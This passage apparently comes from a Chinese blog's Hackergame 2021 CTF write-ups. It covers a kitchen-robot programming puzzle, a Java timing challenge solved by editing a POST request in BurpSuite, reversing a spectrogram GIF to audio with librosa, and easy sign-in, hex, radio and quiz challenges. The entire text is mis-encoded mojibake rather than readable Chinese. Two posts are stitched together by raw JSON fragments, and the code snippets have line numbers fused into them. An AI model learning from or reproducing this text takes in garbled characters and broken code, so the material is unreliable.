åˆšçœ‹é¢˜è¿˜æ˜¯æŒºæ‡µçš„ï¼Œæƒ³äº†å¥½åŠå¤©æ‰æ˜ç™½ç®€å•è¯´æ¥å°±æ˜¯ï¼Œæ¯å¤©å¯ä»¥ç¼–å†™æ–°çš„ç¨‹åºï¼Œä½†æ˜¯åªèƒ½è¿è¡Œä¸€ä¸ªä¹‹å‰ç¼–å†™è¿‡çš„ç¨‹åºæ¯ä¸ªç¨‹åºåªæœ‰å‡ ç§æŒ‡ä»¤å¯ä»¥ä½¿ç”¨ï¼Œéœ€è¦åœ¨å…¶ä¸­æ»¡è¶³èœè°±çš„é¡ºåºè¦æ±‚ è€Œé—®é¢˜åœ¨äºï¼Œç¼–å†™ç¨‹åºåçš„ç¬¬äºŒå¤©çš„èœè°±å¯èƒ½ä¼šä¸åŒï¼Œå¯¼è‡´å‰é¢ç¼–å†™çš„ç¨‹åºæ— æ³•ä½¿ç”¨æ‰€ä»¥å°±éœ€è¦é¢„æµ‹ç¬¬äºŒå¤©çš„èœè°± Level 0å¯ä»¥çœ‹åˆ°ç¬¬ 0 å¤©çš„èœè°±æ˜¯ 1, 0ï¼Œä¹Ÿå°±æ˜¯è¦åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ä¾æ¬¡å‘é”…(1,0)ä¸­æ”¾å…¥ 1 å·é£Ÿç‰©(0,2)å’Œ 0 å·é£Ÿç‰©(0,1)éšä¾¿ç¼–å†™ç¨‹åºä¿å­˜ï¼Œç›´æ¥åˆ°ä¸‹ä¸€å¤©ï¼Œå¯ä»¥å‘ç°èœè°±å‘ç”Ÿäº†å˜åŒ–å¤šæ¬¡å°è¯•ä¹‹åå‘ç°èœè°±åªæœ‰ 0,0 / 0,1 / 1,0 / 1,1 å››ç§ æ‰€ä»¥åœ¨ç¬¬ 0 å¤©ç¼–å†™å­¦ä¹ å››ä¸ªç¨‹åºï¼Œåˆ°ä¸‹ä¸€å¤©å°±å¯ä»¥æ ¹æ®èœè°±æ¥æ‰§è¡Œäº†ä¾‹å¦‚ç¨‹åº 1,0 å°±å¯ä»¥ç¼–å†™ä¸ºï¼š 123456789101112å‘å³ 2 æ­¥æ‹¿èµ· 1 ä¸ªç‰©å“å‘å·¦ 2 æ­¥å‘ä¸‹ 1 æ­¥æ”¾ä¸‹ 1 ä¸ªç‰©å“å‘ä¸Š 1 æ­¥å‘å³ 1 æ­¥æ‹¿èµ· 1 ä¸ªç‰©å“å‘å·¦ 1 æ­¥å‘ä¸‹ 1 æ­¥æ”¾ä¸‹ 1 ä¸ªç‰©å“å‘ä¸Š 1 æ­¥ åªè¦æ­£ç¡®äº†ä¸€å¤©ï¼Œå°±å¯ä»¥æ‹¿åˆ° flag äº† Level 1åªæœ‰ 1 ä¸ªé£Ÿç‰©ï¼Œèœè°±æ˜¯å¥½å¤š 0åŒæ ·éšä¾¿ç¼–å†™ç¨‹åºä¿å­˜è¿›å…¥ä¸‹ä¸€å¤©ï¼Œå‘ç°èœè°±æ²¡æœ‰å˜åŒ–ï¼Œè¿˜æ˜¯ 73 ä¸ª 0æ‰€ä»¥è¿™ä¸€å…³å¯èƒ½åªæ˜¯å¾ªç¯çš„æ•™ç¨‹å¯ç”¨çš„æŒ‡ä»¤ä¸­æœ‰ä¸€æ¡ â€œå¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº n å‘ä¸Šè·³è½¬ m è¡Œâ€å¯ä»¥ç”¨å®ƒæ¥è¾¾åˆ°å¾ªç¯çš„æ•ˆæœ åªéœ€è¦æ‹¿ 73 ä¸ªç‰©å“ï¼Œç„¶åå¾ªç¯æ”¾ä¸‹ç›´åˆ°æ‰‹ä¸­æ²¡æœ‰äº†å³å¯ 123456å‘å³ 1 æ­¥æ‹¿èµ· 73 ä¸ªç‰©å“å‘å·¦ 1 æ­¥å‘ä¸‹ 1 æ­¥æ”¾ä¸‹ 1 ä¸ªç‰©å“å¦‚æœæ‰‹ä¸Šçš„ç‰©å“å¤§äºç­‰äº 1 å‘ä¸Šè·³è½¬ 1 è¡Œ åŒæ ·ä¿å­˜ä¸‹ä¸€å¤©æ‰§è¡Œå°±å¯ä»¥æ‹¿åˆ° flag äº† å‰©ä¸‹çš„ä¸¤ä¸ªçœ‹èµ·æ¥å¤§æ¦‚æ˜¯é€šè¿‡æºç æ¥æ¨æµ‹å‡ºèœè°±çš„ç”Ÿæˆæ–¹æ³•ï¼Œç„¶åç¼–å†™ç›¸åº”çš„æŒ‡ä»¤ï¼Œå¤ªéš¾äº†ï¼Œä¸ä¼šqwq åŠ©è®°è¯é¢˜ç›®æœ‰æ•ˆå†…å®¹ï¼š ä½ çš„å®¤å‹ç»ˆäºè¿å¤œèµ¶å®Œäº†ä»–çš„ Java è¯­è¨€ç¨‹åºè®¾è®¡çš„è¯¾ç¨‹å¤§ä½œä¸šã€‚çœ‹èµ·æ¥ä»–ä½¿ç”¨ Java 17 å†™äº†ä¸€ä¸ªä¿å­˜åŠ©è®°è¯çš„åç«¯ï¼Œå½“ç„¶è¿˜æœ‰é…å¥—çš„å‰ç«¯ã€‚åŠ©è®°è¯ç”±å››ä¸ªè‹±æ–‡å•è¯ç»„æˆï¼Œæ¯ä¸ªç”¨æˆ·æœ€å¤šä¿å­˜ 32 æ¡ã€‚ ä½ ä»ä»–å……æ»¡æ¿€æƒ…å´åˆå¤¹æ‚ä¸æ¸…çš„è¡¨è¿°ä¸­å¾—çŸ¥ï¼Œä»–ä¼¼ä¹è¿˜ä¸ºæ­¤ä¸“é—¨åœ¨å¤§ä½œä¸šé‡Œè—äº†ä¸¤ä¸ª flagï¼šå½“è®¿é—®å»¶è¿Ÿè¾¾åˆ°ä¸¤ä¸ªç‰¹æ®Šçš„é˜ˆå€¼æ—¶ï¼Œflag ä¾¿ä¼šæ‰“å°å‡ºæ¥ï¼Œå±Šæ—¶ä½ ä¾¿å¯ä»¥æ‹¿ç€ flag è®©ä½ çš„å®¤å‹è¯·ä½ åƒä¸€é¡¿å¤§é¤ã€‚ ä¸‹è½½åˆ°æºç åç¿»ä¸€ç¿»ï¼Œæœ‰ç”¨çš„å°±åªæœ‰ Phrase.java å’Œ Instance.javaå…¶ä¸­ Phrase.java å®šä¹‰äº† Phraseï¼Œå…¶ä¸­é‡è½½äº† equals æ–¹æ³•ï¼Œå…¶ä¸­æœ‰ï¼š 123456try { TimeUnit.MILLISECONDS.sleep(EQUALS_DURATION_MILLIS); // 20ms // TODO: remove it since it is for debugging} catch (InterruptedException e) { throw new RuntimeException(e);} æ‰€ä»¥åœ¨æ¯æ¬¡æ¯”è¾ƒç›¸ç­‰çš„æ—¶å€™å°±ä¼š sleep 20ms è€Œ Instance.java çš„ post æ–¹æ³•ä¸­å¯¹äºæ¯æ¬¡çš„è¾“å…¥ï¼Œéå†è¾“å…¥çš„åˆ—è¡¨ï¼Œç„¶åé€ä¸ªåŠ è¿› HashMap ä¸­åœ¨åŠ å…¥ HashMap çš„æ—¶å€™å°±æ¶‰åŠåˆ°åˆ¤æ–­æ˜¯å¦ç›¸ç­‰è€Œæœ€ç»ˆä¼šåˆ¤æ–­åœ¨å®Œæˆå‰åçš„æ€»çš„æ—¶é—´é—´éš”æ˜¯å¤šå°‘ï¼Œå¦‚æœå¤§äº 600ms å°±æå–å‡ºç¬¬ä¸€ä¸ª flagï¼š 123456789101112var modified = 0;var before = System.nanoTime();for (var i = 0; i &lt; input.length() &amp;&amp; i &lt; MAX_PHRASES &amp;&amp; phrases.size() &lt; MAX_PHRASES; ++i) { var text = input.optString(i, &quot;&quot;).toLowerCase(Locale.ENGLISH); modified += phrases.add(Phrase.create(this.mnemonics, text, token)) ? 1 : 0; // è¿™é‡Œä¼š sleep}var after = System.nanoTime();var duration = TimeUnit.MILLISECONDS.convert(after - before, TimeUnit.NANOSECONDS);if (duration &gt; FLAG1_DURATION_MILLIS) { // 600ms token.addFlag(1, flag -&gt; output.put(&quot;flag1&quot;, flag));} è€Œåœ¨ç½‘é¡µä¸­æ·»åŠ æ¡ç›®çš„æ—¶å€™ï¼Œä¸€æ¬¡åªèƒ½æ·»åŠ ä¸€æ¡ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª POST é‡Œé¢åªæœ‰ä¸€ä¸ª Phraseä½†æ˜¯æºç ä¸­æœ‰ä¸€ä¸ªå¾ªç¯ï¼Œéå†æ•´ä¸ª inputï¼Œæ‰€ä»¥ä¸€ä¸ª POST é‡Œçš„å†…å®¹å…¶å®æ˜¯ä¸€ä¸ªåˆ—è¡¨æ‰€ä»¥å¯ä»¥ç”¨ BurpSuite è·å– POST ç„¶åæ›´æ”¹ä¸€ä¸‹å†…å®¹å†å‘é€å‡ºå»ï¼ˆå…ˆ random ä¸€ä¸ªï¼Œç„¶å addï¼‰æ ¹æ® flag é‡Œçš„æç¤ºï¼Œæ­£è§£ï¼ˆç¬¬äºŒé¡¿å¤§é¤ï¼‰åº”è¯¥æ˜¯ä½¿ç”¨å“ˆå¸Œç¢°æ’ï¼Œä½†æ˜¯ä¸ä¼š pğŸ˜­q å­¦ä¼šå‚…é‡Œå¶çš„ä¸€ç¬é—´ï¼Œæ‚”æ¨çš„æ³ªæ°´æµäº†ä¸‹æ¥ã€‚ å½“æˆ‘çœ‹åˆ°éŸ³é¢‘æ’­æ”¾å™¨ä¸­è·³åŠ¨çš„é¢‘è°±åŠ¨ç”»ï¼Œæœˆæ˜æ˜Ÿç¨€çš„å¤œæ™šï¼Œæ·±é‚ƒçš„é“¶æ²³ï¼Œåªæœ‰å¤©ä½¿åœ¨æµ…åŸä½å”±ï¼Œå¤æ‚çš„æƒ…æ„Ÿäºæˆ‘çœ¼ä¸­æº¢å‡ºï¼Œåƒæ˜¯æ²‰å…¥äº†é›¾é‡Œæœ¦èƒ§çš„æµ·ä¸€æ ·çš„æ¸©æŸ”ã€‚ è¿™ä¸€åˆ»æˆ‘æ‰çŸ¥é“ï¼Œè€³æœºéŸ³å“ä¹Ÿå°±å›¾ä¸€ä¹ï¼ŒçœŸå¬éŸ³ä¹è¿˜å¾—é çœ¼ç›ã€‚ ï¼ˆæ³¨æ„ï¼šflag èŠ±æ‹¬å·å†…æ˜¯ä¸€ä¸ª 12 ä½æ•´æ•°ï¼Œç”± 0-9 æ•°ä½ç»„æˆï¼Œæ²¡æœ‰å…¶å®ƒå­—ç¬¦ã€‚ï¼‰ è™½ç„¶è¿™é¢˜æ˜¯åœ¨å€’æ•°ç¬¬ä¸‰é¢˜ï¼Œè¿˜å€¼ 400ptï¼Œä½†ä½ ä¸€è¯´å‚…é‡Œå¶æˆ‘å¯å°±ä¸å›°äº†å—· ä¸‹è½½é¢˜ç›®åŒ…ï¼Œæœ‰ä¸€ä¸ªç”Ÿæˆ gif çš„ py ä»£ç å’Œé‚£ä¸ª gif æ–‡ä»¶æ­£å¥½å‰é¢çš„ç”µæ³¢ä¹Ÿæœ‰ä¸€æ®µéŸ³é¢‘ï¼Œå¯ä»¥ç”¨é‚£ä¸ªå¸¦å…¥åˆ° generate_sound_visualization.py ä¸­ç”Ÿæˆä¸€ä¸ª gifï¼Œç„¶åç”¨è¿™ä¸ªæ¥æµ‹è¯• å†ä»”ç»†çœ‹ä¸€çœ‹ generate_sound_visualization.py è¿™ä¸ªæ–‡ä»¶ä¸»è¦ä½¿ç”¨äº† librosaï¼Œäºæ˜¯å°±å¯ä»¥ç¿»æ–‡æ¡£æ¥çœ‹æ‡‚è¿™ä¸ªç¨‹åºï¼š 123456789101112y, sample_rate = librosa.load(&quot;flag.mp3&quot;) # ä»mp3ä¸­è¯»å–æ•°æ®å’Œé‡‡æ ·ç‡spectrogram = numpy.around( # å››èˆäº”å…¥ï¼Œä½†ä¼šé€ æˆé€†å‘çš„æ—¶å€™æœ‰å°‘è®¸è¯¯å·®å¯¼è‡´æ‚éŸ³ librosa.power_to_db( # æŠŠä»¥åŠŸç‡ä¸ºå•ä½çš„é¢‘è°±å›¾è½¬æ¢ä¸ºä»¥åˆ†è´ä¸ºå•ä½ librosa.feature.melspectrogram( # é€šè¿‡éŸ³é¢‘æ•°æ®å’Œé‡‡æ ·ç‡è®¡ç®—æ¢…å°”é¢‘è°± y, sample_rate, n_mels=num_freqs, n_fft=fft_window_size, hop_length=frame_step_size, window=window_function_type ) ) / quantize # é™¤ä»¥2) * quantize # ä¹˜ä»¥2 ç„¶ååˆé€šè¿‡ä¸€äº› numpy çš„éªšæ“ä½œæ¥ç”Ÿæˆæ¯ä¸€å¸§çš„æ•°æ®ï¼Œç„¶åé€šè¿‡ array2gif åŒ…çš„ write_gif å‡½æ•°æ¥ç”Ÿæˆ gif æ‰€ä»¥ä¸»è¦æ€è·¯å°±æ˜¯æŠŠæ•´ä¸ªç¨‹åºå®Œæ•´åœ°é€†è¿‡æ¥ ç”±äºå¿…åº”æ²¡æœ‰æŸ¥åˆ° gif2array çš„åŒ…ï¼Œæ‰€ä»¥è¯»å– gif å°±ç”¨äº†ç»å…¸ PIL.Imageï¼š 123456789from PIL import Imagefile = Image.open(&quot;flag.gif&quot;)try: while True: gif_data.append(np.array(file)) file.seek(file.tell() + 1)except: print(&quot;[+] Read gif file&quot;) ç„¶åæ˜¯è§£å†³é‚£ä¸€å¤§æ®µ numpy éªšæ“ä½œçš„é€†éªšæ“ä½œï¼ˆä½†æ˜¯æ•°ç†åŸºç¡€è¿™ä¹ˆå·®çš„æˆ‘å½“ç„¶æ˜¯ä¸æƒ³ä»”ç»†ç ”ç©¶äº†ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ç”µæ³¢é‚£é¢˜çš„ radio.mp3 å¸¦å…¥ï¼Œçœ‹ä¸€çœ‹è¦å¾—åˆ°çš„ spectrogram æ˜¯ä»€ä¹ˆæ ·å­è¾“å‡ºå¾—åˆ°çš„ spectrogram æ˜¯ï¼š 1234567[[-58. -48. -30. ... -58. -58. -58.] [-58. -44. -26. ... -58. -58. -58.] [-58. -40. -16. ... -58. -58. -58.] ... [-58. -42. -30. ... -58. -58. -58.] [-58. -44. -32. ... -58. -58. -58.] [-58. -46. -34. ... -58. -58. -58.]] è€Œè½¬ç½®è¿‡æ¥æ˜¯ï¼š 1234567[[-58. -58. -58. ... -58. -58. -58.] [-48. -44. -40. ... -42. -44. -46.] [-30. -26. -16. ... -30. -32. -34.] ... [-58. -58. -58. ... -58. -58. -58.] [-58. -58. -58. ... -58. -58. -58.] [-58. -58. -58. ... -58. -58. -58.]] å‡å» min_db=-60 ç¬¬ä¸€è¡Œæ­£å¥½æ˜¯ 2ï¼Œç¬¬äºŒè¡Œæ˜¯ [12. 16. 20. â€¦ 18. 16. 14.]å†å¯¹åº”åˆ°ç”Ÿæˆçš„ gif æ–‡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹å‡º gif çš„ç¬¬ä¸€å¸§æ¯ä¸ªçŸ©å½¢çš„é«˜åº¦éƒ½æ˜¯ 2è€Œç¬¬äºŒå¸§æ¯ä¸ªçŸ©å½¢çš„é«˜åº¦ä¹Ÿæ°å¥½æ˜¯åˆšå¾—å‡ºçš„é‚£ç»„æ•°æ‰€ä»¥è¦å¾—åˆ°çš„ spectrogram å°±æ˜¯ gif æ¯ä¸€å¸§æ‰€æœ‰çŸ©å½¢çš„é«˜åº¦æ„æˆçš„çŸ©é˜µçš„è½¬ç½® å†ç»“åˆæºç ï¼š 1234567numpy.array([ [ red_pixel if freq % 2 and round(frame[freq // 2]) &gt; threshold else white_pixel for threshold in list(range(min_db, max_db + 1, quantize))[::-1] ] for freq in range(num_freqs * 2 + 1)]) å¯ä»¥çœ‹å‡ºï¼Œæ¯ä¸ªçŸ©å½¢åŠ ä¸Šå·¦è¾¹çš„ç©ºæ ¼æ­£å¥½æ˜¯ 4 ä¸ªåƒç´ ï¼Œæ‰€ä»¥æ¯å››åˆ—è¯»å–æœ€åä¸€åˆ—å³å¯ï¼š 12345678910spectrogramT = []for data in gif_data: res = [] for ind, line in enumerate(data.transpose()): # å°†æ¯ä¸€å¸§è½¬ç½®ï¼Œæ–¹ä¾¿è®¡ç®— num = sum(line) # è®¡ç®—æ¯ä¸ªçŸ©å½¢çš„é«˜åº¦ï¼ˆè½¬ç½®åæ˜¯å®½åº¦ï¼‰ if ind % 4 == 3: res.append(num + min_db) # å¾—åˆ°çš„æ•°è¦åŠ ä¸Š-60æ‰ç¬¦åˆè§„çŸ© spectrogramT.append(res)spectrogram = np.array(spectrogramT).transpose() # å¾—åˆ°çš„ç»“æœè½¬ç½®ä¸€ä¸‹ è¿™æ ·å°±å¾—åˆ°äº†æ¢…å°”é¢‘è°±å›¾çš„æ•°æ®ï¼Œå¯ä»¥å¯¹ librosa çš„éƒ¨åˆ†è¿›è¡Œé€†è¿‡ç¨‹äº†ç¿» librosa çš„æ–‡æ¡£ï¼Œæœ‰ power_to_db å½“ç„¶ä¹Ÿå°±æœ‰ db_to_powerè€Œä¸”ç±»ä¼¼äº melspectrogram å‡½æ•°åœ¨ librosa.feature ä¸­ï¼Œå¯ä»¥ä¸“é—¨çœ‹ feature éƒ¨åˆ†çš„æ–‡æ¡£ç¿»åˆ°äº† inverse éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªå‡½æ•° librosa.feature.inverse.mel_to_audio å¯ä»¥ç›´æ¥æŠŠæ¢…å°”é¢‘è°±å›¾ä¸“ä¸ºéŸ³é¢‘æ•°æ®ï¼Œæ‰€ä»¥å°±ç”¨å®ƒäº†ï¼š 1234567y = librosa.feature.inverse.mel_to_audio( librosa.db_to_power(spectrogram), # ä¹˜äºŒé™¤äºŒæ²¡ä»€ä¹ˆå¤§ç”¨ï¼Œè€Œä¸”å½±å“æ•ˆæœï¼Œå°±åˆ äº† sample_rate, n_iter=num_freqs, # é‡‡æ ·ç‡é¢˜ç›®æä¾›äº†ï¼Œæ˜¯ 22050Hz n_fft=fft_window_size, hop_length=frame_step_size, window=window_function_type,) è¿™æ ·å°±å®Œæˆäº†è¿˜åŸï¼Œæœ€åæ˜¯è¾“å‡ºï¼Œä½†æ˜¯å¹¶æ²¡åœ¨ librosa ä¸­æ‰¾åˆ°éŸ³é¢‘è¾“å‡ºçš„å‡½æ•°ï¼Œæ‰€ä»¥å°±ç”¨äº†ç»å…¸ soundfileï¼š 12import soundfile as sfsf.write(&quot;flag.wav&quot;, y, sample_rate) ç„¶åæ‰“å¼€å¬å°±è¡Œäº†ï¼Œé¢˜ç›®è¯´äº†æ˜¯ä¸ª 12 ä½æ•°ï¼Œæ‰€ä»¥å‰©ä¸‹çš„å°±æ˜¯è‹±è¯­å¬åŠ›äº†ï¼Œç¿»è¯‘è¿‡æ¥çš„æ•°å­—å°±æ˜¯ flag äº† åŸºæœ¬ä¸Šæˆ‘è§‰å¾—æ¯”è¾ƒç®€å•çš„ä¹Ÿå°±è¿™äº›äº†ï¼Œå‰©ä¸‹çš„ä»¤æˆ‘ç ´é˜²çš„æ”¾ä¸‹ä¸€ç¯‡_(:Ğ·ã€âˆ )_ Reference ä¼ªé€ httpè¯·æ±‚ipåœ°å€ - åšå®¢å›­ GraphQLå®˜ç½‘ã€GraphiQLã€GraphQL Voyager ã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰- çŸ¥ä¹ librosaæ–‡æ¡£ PySoundFileæ–‡æ¡£ &lt; #1 #3 &gt;","link":"/p/f54b44c.html"},{"title":"ã€ŒHackergame 2021ã€#1 Writup å¼€å±€ä¸Šåˆ†ç¯‡ 0","text":"&lt; #0 #2 &gt; è¿™ç¯‡ Writeup å†™ä¸€ä¸‹ Hackergame 2021 é‡Œé¢æ¯”è¾ƒå¥½åšçš„ä¸€äº›é¢˜ç›®åšæ³•ï¼ˆä»¥åŠåæ§½ï¼‰ï¼šç­¾åˆ°ã€åå…­è¿›åˆ¶ã€ç”µæ³¢ã€çŒ«å’ªé—®ç­”ã€å–ç“œã€é€æ˜æ–‡ä»¶ã€æ—…è¡Œç…§ç‰‡ å¼€å±€åŸºæœ¬ä¸Šå°±é è¿™äº›ä¸Šåˆ†äº†ï¼ˆé€ƒä¹Ÿéƒ½æ˜¯çœ‹ä¸Šå»å°±çŸ¥é“è¯¥æ€ä¹ˆåšï¼Œåªæ˜¯å®ç°çš„éš¾åº¦ä¸åŒäº†ï¼ˆ ç­¾åˆ° ä¸ºäº†èƒ½è®©å¤§å®¶é¡ºåˆ©ç­¾åˆ°ï¼Œå‘½é¢˜ç»„æŠŠæ¯ä¸€ç§’çš„ flag éƒ½è®°å½•ä¸‹æ¥åˆ¶æˆäº†æ—¥è®°æœ¬çš„ä¸€é¡µã€‚ä½ åªéœ€è¦æ‰“å¼€æ—¥è®°ï¼Œç¿»åˆ° Hackergame 2021 æ¯”èµ›è¿›è¡ŒæœŸé—´çš„ä»»ä½•ä¸€é¡µå°±èƒ½å¾—åˆ° flagï¼ å¾ˆæ˜ç¡®ï¼Œè¿›å…¥ç½‘å€åä¸€ç›´ç‚¹ Next ç¿»åˆ°æ¯”èµ›æ—¶é—´å°±å¥½äº†ï¼ˆè¯¯ çœ‹åˆ°äº† URI é‡Œæœ‰ ?page=...ï¼Œæ‰€ä»¥ä¹Ÿæ‡’å¾—è®¡ç®—äº†ï¼Œæ‰‹åŠ¨äºŒåˆ†ï¼Œå¤§æ¦‚ ?page=1635000000 å·¦å³å°±å¯ä»¥çœ‹åˆ° flag äº† èµ›åæ‰ååº”è¿‡æ¥åŸæ¥æ˜¯ UNIX æ—¶é—´æˆ³ è¿›åˆ¶åå…­â€”â€”å‚ä¸Šä¹Ÿå¾ˆæ˜ç¡®ï¼Œç›´æ¥æŠŠå³ä¾§æŒ¡ä½çš„ flag éƒ¨åˆ†å¯¹åº”å·¦è¾¹çš„åå…­è¿›åˆ¶æ•°æ¢ç®—æˆåè¿›åˆ¶ï¼Œç„¶åæ ¹æ® ASCII ç è½¬æˆå­—ç¬¦ã€‚æˆ–è€…ç›´æ¥æŠŠå·¦ä¾§æŠ„è¿› Hex Friend ä¹Ÿå¯ä»¥ç›´æ¥å¾—åˆ°å³ä¾§çš„flagã€‚ ï¼ˆ**å½“æ—¶è¿™é¢˜æŠ„ä¸²è¡Œäº†ä¸¤ä¸‰æ¬¡â€¦â€¦ï¼‰ å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢ å½“ç„¶ï¼Œå¦‚æœåªæ˜¯è¿™æ ·è¿˜è¿œè¿œä¸å¤Ÿã€‚éµä¾å²ç§°â€œè€çˆ¹â€çš„ä¸Šå¤å…ˆè´¤çš„è‡³ç†åè¨€ï¼Œå¿…é¡»è¦â€œç”¨é­”æ³•æ‰“è´¥é­”æ³•â€ã€‚X åŒå­¦å‘ä¸Šçº§ç”³è¯·åˆ°äº†ç§‘å¤§è¥¿åŒºåŒæ­¥è¾å°„å®éªŒå®¤è®¾å¤‡çš„ä½¿ç”¨æƒé™ï¼Œä»¥æ­¤æ‰“é€šæ¬¡å…ƒç©ºé—´ï¼Œå€ŸåŠ©åˆ°å¦ä¸€ä¸ªå¹³è¡Œå®‡å®™ä¸­ Z åŒå­¦çš„æ³•åŠ›è¿›è¡Œæ•°æ®å¯¹å†²ï¼Œæ–¹æ‰äºä¹±ä¸­æå¾—ä¸€ä¸æœºä¼šï¼Œå°† flag ç”¨æ— çº¿ç”µçš„å½¢å¼å‘å°„äº†å‡ºå»ã€‚ è€ƒè™‘åˆ°ä¿¡æ¯çš„é²æ£’æ€§ï¼ŒX åŒå­¦ä½¿ç”¨äº†æ— çº¿ç”µä¸­æƒ¯ç”¨çš„æ–¹æ³•æ¥åŒºåˆ†å­—ç¬¦ä¸²ä¸­è¯»éŸ³ç›¸è¿‘çš„å­—æ¯ã€‚å³ä½¿å¦‚æ­¤ï¼Œæ‰“ç ´æ¬¡å…ƒçš„å¼ºå¤§èƒ½é‡æ‰­æ›²äº†æ—¶ç©ºï¼Œä½¿å¾—æœ€ç»ˆæ¥å—åˆ°çš„å½•éŸ³çš„é€Ÿåº¦æœ‰æ‰€æ”¹å˜ã€‚ ï¼ˆè¿™é¢˜åœ¨ç¾¤é‡Œçœ‹èµ·æ¥å¥½åƒå¡äº†å¾ˆå¤šäººï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰é¢˜ç›®ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå¬èµ·æ¥æ‚ä¹±çš„éŸ³é¢‘ é¢˜é‡Œæœ€åè¯´äº† â€œæœ€ç»ˆæ¥å—åˆ°çš„å½•éŸ³çš„é€Ÿåº¦æœ‰æ‰€æ”¹å˜â€ï¼Œæ‰€ä»¥è€ƒè™‘å°†éŸ³é¢‘æ—¶é—´æ‹‰é•¿ã€‚æœ€å¼€å§‹ä½¿ç”¨äº† Adobe Auditionï¼Œä½†æ˜¯æ•ˆæœä¸æ˜¯å¾ˆç†æƒ³ï¼Œå¤§æ¦‚æ˜¯é‡æ–°é‡‡æ ·ç­‰ä¸€ç³»åˆ—ç®—æ³•å¯¼è‡´çš„æ‰€ä»¥æ¢äº† Adobe Premier Pro ç›´æ¥ç”¨æ¯”ç‡æ‹‰ä¼¸å·¥å…·æ‹‰é•¿éŸ³é¢‘ï¼Œè¿˜æ˜¯å¯ä»¥å¬æ¸…çš„ä¸æ–­å°è¯•ä¹‹åï¼Œå¤§æ¦‚æ”¾æ…¢ä¸‰å€å·¦å³å°±å¯ä»¥å¬å‡ºè¯»çš„æ˜¯è‹±è¯­å•è¯äº† é¢˜é‡Œè¯´åˆ°äº† â€œè€ƒè™‘åˆ°ä¿¡æ¯çš„é²æ£’æ€§ï¼ŒX åŒå­¦ä½¿ç”¨äº†æ— çº¿ç”µä¸­æƒ¯ç”¨çš„æ–¹æ³•æ¥åŒºåˆ†å­—ç¬¦ä¸²ä¸­è¯»éŸ³ç›¸è¿‘çš„å­—æ¯â€ï¼Œæ‰€ä»¥å°±æŸ¥åˆ°äº†å›½é™…èˆªç©ºæ— çº¿ç”µé€šè®¯26ä¸ªè‹±æ–‡å­—æ¯è¯»æ³•ç„¶åä»”ç»†å¬ï¼Œè¾¨åˆ«æ¯ä¸ªå•è¯çš„ç¬¬ä¸€ä¸ªéŸ³å°±å¯ä»¥å¾—åˆ° flag äº† çŒ«å’ªé—®ç­” Pro Maxäº”é“åˆé’»çš„é¢˜ç›®ï¼Œä½†æ˜¯è¿˜æ˜¯å¥½æŸ¥åˆ°çš„ï¼Œé¢˜ç›®é‡Œä¹Ÿè¯´äº†â€œè§£å‡ºè°œé¢˜ä¸éœ€è¦æ˜¯ç§‘å¤§åœ¨æ ¡å­¦ç”Ÿâ€ 2017 å¹´ï¼Œä¸­ç§‘å¤§ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨ï¼ˆSEC@USTCï¼‰å¹¶å…¥ä¸­ç§‘å¤§ Linux ç”¨æˆ·åä¼šï¼ˆUSTCLUGï¼‰ã€‚ç›®å‰ï¼Œä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨çš„åŸŸåï¼ˆsec.ustc.edu.cnï¼‰å·²ç»æ— æ³•è®¿é—®ï¼Œä½†ä½ èƒ½æ‰¾åˆ°ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨çš„ç¤¾å›¢ç« ç¨‹åœ¨å“ªä¸€å¤©çš„ä¼šå‘˜ä»£è¡¨å¤§ä¼šä¸Šé€šè¿‡çš„å—ï¼Ÿ çœ‹åˆ°äº† â€œç›®å‰ï¼Œå·²ç»æ— æ³•è®¿é—®â€ è¯´æ˜è¿™ä¸ªåŸŸåæ›¾ç»æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œç›´æ¥é€šè¿‡äº’è”ç½‘çš„è®°å¿†archive.orgï¼ŒæŸ¥åˆ°è¿™ä¸ªåŸŸåçš„å†å²å­˜æ¡£ï¼Œéšä¾¿æ‰¾ä¸€å¤©å°±å¯ä»¥çœ‹åˆ°ä»–ä»¬å®˜ç½‘ä¸­çš„ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨ç¤¾å›¢ç« ç¨‹ã€‚å…¶ä¸­ç¬¬ä¸€è¡Œå°±å†™äº† â€œæœ¬ç« ç¨‹åœ¨ 2015 å¹´ 5 æœˆ 4 æ—¥ï¼Œç»ä¼šå‘˜ä»£è¡¨å¤§ä¼šå®¡è®®é€šè¿‡ã€‚â€ æ‰€ä»¥ç­”æ¡ˆå°±æ˜¯ 20150504 ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ Linux ç”¨æˆ·åä¼šåœ¨è¿‘äº”å¹´å¤šå°‘æ¬¡è¢«è¯„ä¸ºæ ¡äº”æ˜Ÿçº§ç¤¾å›¢ï¼Ÿ ç›´æ¥å»ç§‘å¤§ LUG å®˜ç½‘çš„ Intro é¡µé¢ï¼Œå°±å¯ä»¥çœ‹åˆ° â€œäº 2015 å¹´ 5 æœˆã€2017 å¹´ 7 æœˆã€2018 å¹´ 9 æœˆã€2019 å¹´ 8 æœˆåŠ 2020 å¹´ 9 æœˆè¢«è¯„ä¸ºä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦äº”æ˜Ÿçº§å­¦ç”Ÿç¤¾å›¢ã€‚â€æ‰€ä»¥æ˜¯4æ¬¡ï¼ˆxä½†æ˜¯æ€€ç–‘ä¸€ä¸‹ä¸ºä»€ä¹ˆæ²¡æœ‰2021å¹´ï¼Œå› ä¸ºéƒ½æ˜¯åœ¨9æœˆä»½å·¦å³ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯æ•°æ®æ²¡æ›´æ–°ï¼Œè¿™é¢˜4å’Œ5éƒ½æœ‰å¯èƒ½ 